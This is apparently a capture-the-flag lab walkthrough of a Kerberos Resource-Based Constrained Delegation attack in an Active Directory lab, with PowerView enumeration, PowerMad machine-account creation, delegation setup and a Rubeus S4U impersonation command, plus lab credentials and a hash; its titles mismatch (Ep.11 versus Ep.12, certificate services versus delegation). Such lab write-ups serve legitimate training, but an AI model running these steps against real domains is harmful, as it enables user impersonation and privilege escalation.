---
date: 2025-03-19
categories: [CTF, IML]
title: "IML - Kerberos: Ep.11 – Active Directory Certificate Services"
tags: ['kerberos', 'powershell', 'privilege escalation', 'rce']

description: "Kerberos Ep.11 – Resource-Based Constrained Delegation (RBCD) - A walkthrough of the challenge with enumeration, exploitation and privilege escalation steps."
---

---
---

# IML - Kerberos: Ep.12 – Active Directory Certificate Services
IML - Kerberos: Ep.11 – Resource-Based Constrained Delegation (RBCD)


![image1](../resources/acf4b1efdfed40ba82617d29aaac9a3c.png)

- RDP:
```bash
xfreerdp /v:10.102.81.46 /u:s.villanelle /p:Summ3r2021! /d:krbtown +clipboard +drives /drive:root,/home/kali /dynamic-resolution

```

![image2](../resources/59f728b2e31143279fb57ff6abe435e4.png)


![image3](../resources/00add91b42de458cb58e3d5d8fd2c494.png)

- Enumeration:

```bash
. .\PowerView.ps1

get-domainuser s.villanelle -properties objectsid | select -exp objectsid

```

![image4](../resources/9fce19984a314375ad5e4ac1279d4a2c.png)

- Then, use the SID to enumerate what rights you have over Workstation-02 by running the command:

```bash
get-domainobjectacl workstation-02 | ?{$_.SecurityIdentifier -eq "[USER_SID]"}

get-domainobjectacl workstation-02 | ?{$_.SecurityIdentifier -eq "S-1-5-21-2984655098-284417223-3543700247-1121"}

```

![image5](../resources/d345e612b4484a6fa8e077489e00020c.png)


![image6](../resources/1486aeb35ae747a49a89028b530b5328.png)


![image7](../resources/3825e0e3c43b4055af8892ecada67b4d.png)


![image8](../resources/2e5c18f4823445d0bcc084376334c4de.png)

- Open Elevated Powershell:
```bash
. .\Powerview.ps1

Get-DomainObject -Identity "dc=krbtown,dc=local" -Domain krbtown.local

```

![image9](../resources/e2cb819759a4414e89e754b176536469.png)


![image10](../resources/33a1927dd54646c9b9b040094cdca15b.png)


![image11](../resources/a9d5c91b7e574921a84d4ce2944b53bf.png)


![image12](../resources/6f0f3726c11a4c39b07f2bb2d69f445b.png)


![image13](../resources/d847b9c6c0104d779bdacc1f4aed11cb.png)

- Open Elevated Powershell
```bash
. .\Powerview.ps1

Get-NetComputer Workstation-02 | Select-Object -Property name, msDS-AllowedToActOnBehalfOfOtherIdentity

```

![image14](../resources/6ef8a7da86574f3e8abf78ffcc3ac025.png)


![image15](../resources/c85c465d4bb84a69a6930dfb6fb76267.png)

- Open Elevated Powershell:
```bash
. ./PowerMad.ps1

```
New-MachineAccount -MachineAccount \<ANY_MACHINE_NAME\> -Password \$(ConvertTo-SecureString '\<RANDOM_PASSWORD\>' -AsPlainText -Force) -Verbose

**Give the machine a name of your choice and a password that meets the password policy**

```bash
New-MachineAccount -MachineAccount terminator -Password $(ConvertTo-SecureString 'Password123' -AsPlainText -Force) -Verbose

```

![image16](../resources/4dff6fa14feb4fe097312d863f93126c.png)


![image17](../resources/b79ee794a7124ad5a9eda5f3ddf1e9cd.png)

Set-ADComputer workstation-02 -PrincipalsAllowedToDelegateToAccount \<NEW_MACHINE_NAME\>\$

```bash
Set-ADComputer workstation-02 -PrincipalsAllowedToDelegateToAccount terminator$

```

![image18](../resources/bec307712f264d0dbebbb9bd49581ebe.png)

- Open Elevated Powershell
```bash
. .\Powerview.ps1

Get-ADComputer workstation-02 -Properties PrincipalsAllowedToDelegateToAccount

```

![image19](../resources/b30d43b19de345279141f03ba543e019.png)


![image20](../resources/cb2f4b40c2bf4a88bd70115e9afc2e0a.png)


![image21](../resources/dd5d27563c1c482da276e7111c53c94f.png)

- Open Elevated Powershell:
.\Rubeus.exe hash /password:\<PASSWORD_OF_NEW_MACHINE\> /user:\<NEW_MACHINE_USERNAME\>\$ /domain:krbtown.local

```bash
.\Rubeus.exe hash /password:Password123 /user:terminator$ /domain:krbtown.local

```

![image22](../resources/47e81e1cbd1d473c8b9cecb6bd34144c.png)


![image23](../resources/d3dcf7d691724bde8927c93f60381887.png)

rubeus s4u /user:\<NEW_MACHINE_USERNAME\>\$ /rc4:\<NEW_MACHINE_HASH\> /impersonateuser:a.belridge /domain:krbtown.local /msdsspn:cifs/workstation-02.krbtown.local /ptt

```bash
.\Rubeus.exe s4u /user:terminator\$ /rc4:58A478135A93AC3BF058A5EA0E8FDB71 /impersonateuser:a.belridge /domain:krbtown.local /msdsspn:cifs/workstation-02.krbtown.local /ptt

```

![image24](../resources/6478b76b0a284ac9890acd4e0938be08.png)


![image25](../resources/b3ebf0d4a70641e4b5cb7cbd832fd8bf.png)

- Check with: klist

![image26](../resources/20805bf54d6747448d1f41b316f581cd.png)


![image27](../resources/040b0400cc41472fb844f81364478e73.png)


![image28](../resources/00e48279ffef426d8baf930a3a5d04a3.png)


![image29](../resources/ca60ab9335384cc7879ce72eff5f6a37.png)
